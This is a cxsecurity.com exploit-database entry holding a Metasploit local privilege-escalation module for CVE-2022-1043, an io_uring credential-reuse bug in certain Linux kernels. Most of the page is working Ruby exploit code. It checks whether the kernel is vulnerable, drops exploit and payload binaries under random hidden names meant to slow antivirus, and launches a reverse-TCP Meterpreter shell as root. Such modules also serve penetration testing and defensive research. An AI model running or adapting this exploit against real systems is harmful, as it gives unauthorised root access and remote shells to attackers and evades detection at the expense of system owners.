---
title: io_uring Same Type Object Reuse Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2023020003
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-02
fetch_date: 2025-10-04T05:28:31.292041
---

# io_uring Same Type Object Reuse Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **io\_uring Same Type Object Reuse Privilege Escalation** **2023.02.01**  Credit:  **[h00die](https://cxsecurity.com/author/h00die/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2022-1043](https://cxsecurity.com/cveshow/CVE-2022-1043/ "Click to see CVE-2022-1043")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Local
Rank = GreatRanking # https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking
include Msf::Post::Linux::Priv
include Msf::Post::Linux::System
include Msf::Post::Linux::Kernel
include Msf::Post::File
include Msf::Exploit::EXE
include Msf::Exploit::FileDropper
include Msf::Post::Linux::Compile
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'io\_uring Same Type Object Reuse Priv Esc',
'Description' => %q{
This module exploits a bug in io\_uring leading to an additional put\_cred()
that can be exploited to hijack credentials of other processes.
We spawn SUID programs to get the free'd cred object reallocated by a
privileged process and abuse them to create a SUID root binary ourselves
that'll pop a shell.
The dangling cred pointer will, however, lead to a kernel panic as soon as
the task terminates and its credentials are destroyed. We therefore detach
from the controlling terminal, block all signals and rest in silence until
the system shuts down and we get killed hard, just to cry in vain, seeing
the kernel collapse.
The bug affected kernels from v5.12-rc3 to v5.14-rc7.
More than 1 CPU is required for exploitation.
Successfully tested against Ubuntu 22.04.01 with kernel 5.13.12-051312-generic
},
'License' => MSF\_LICENSE,
'Author' => [
'h00die', # msf module
'Ryota Shiga', # discovery
'Mathias Krause' # original PoC, analysis
],
'Platform' => [ 'linux' ],
'Arch' => [ ARCH\_X86, ARCH\_X64 ],
'SessionTypes' => [ 'shell', 'meterpreter' ],
'Targets' => [[ 'Auto', {} ]],
'Privileged' => true,
'References' => [
[ 'URL', 'https://grsecurity.net/exploiting\_and\_defending\_against\_same\_type\_object\_reuse' ],
[ 'URL', 'https://github.com/opensrcsec/same\_type\_object\_reuse\_exploits' ],
[ 'URl', 'https://github.com/torvalds/linux/commit/a30f895ad3239f45012e860d4f94c1a388b36d14' ],
[ 'CVE', '2022-1043' ]
],
'DisclosureDate' => '2022-03-22',
'DefaultOptions' => {
'PAYLOAD' => 'linux/x64/meterpreter/reverse\_tcp',
'PrependFork' => true
},
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [ARTIFACTS\_ON\_DISK]
}
)
)
register\_advanced\_options [
OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
]
end
# Simplify pulling the writable directory variable
def base\_dir
datastore['WritableDir'].to\_s
end
def check
# Check the kernel version to see if its in a vulnerable range
release = kernel\_release
if Rex::Version.new(release.split('-').first) > Rex::Version.new('5.14-rc7') ||
Rex::Version.new(release.split('-').first) < Rex::Version.new('5.12-rc3')
vprint\_error "Kernel version #{release} is not vulnerable"
return CheckCode::Safe
end
vprint\_good "Kernel version #{release} appears to be vulnerable"
# make sure we have enough CPUs. Minimum 2 required
cpu = get\_cpu\_info
if cpu[:cores] < 2
CheckCode::Safe("> 1 CPU required, detected: #{cpu[:cores]}")
end
CheckCode::Vulnerable("> 1 CPU required, detected: #{cpu[:cores]}")
end
def exploit
# Check if we're already root
if is\_root? && !datastore['ForceExploit']
fail\_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override'
end
# Make sure we can write our exploit and payload to the local system
unless writable? base\_dir
fail\_with Failure::BadConfig, "#{base\_dir} is not writable"
end
# Upload exploit executable, writing to a random name so AV doesn't have too easy a job
executable\_name = ".#{rand\_text\_alphanumeric(5..10)}"
executable\_path = "#{base\_dir}/#{executable\_name}"
payload\_path = "#{base\_dir}/.#{rand\_text\_alphanumeric(5..10)}"
if live\_compile?
vprint\_status 'Live compiling exploit on system...'
code = strip\_comments(exploit\_source('CVE-2022-1043', 'cve-2022-1043.c'))
upload\_and\_compile executable\_path, code
else
vprint\_status 'Dropping pre-compiled exploit on system...'
upload\_and\_chmodx executable\_path, exploit\_data('CVE-2022-1043', 'pre\_compiled')
end
# Upload payload executable
upload\_and\_chmodx payload\_path, generate\_payload\_exe
register\_files\_for\_cleanup(payload\_path)
register\_files\_for\_cleanup(executable\_path)
timeout = 30
print\_status 'Launching exploit...'
output = cmd\_exec "echo '#{payload\_path} & exit' | #{executable\_path}", nil, timeout
output.each\_line { |line| vprint\_status line.chomp }
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020003)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top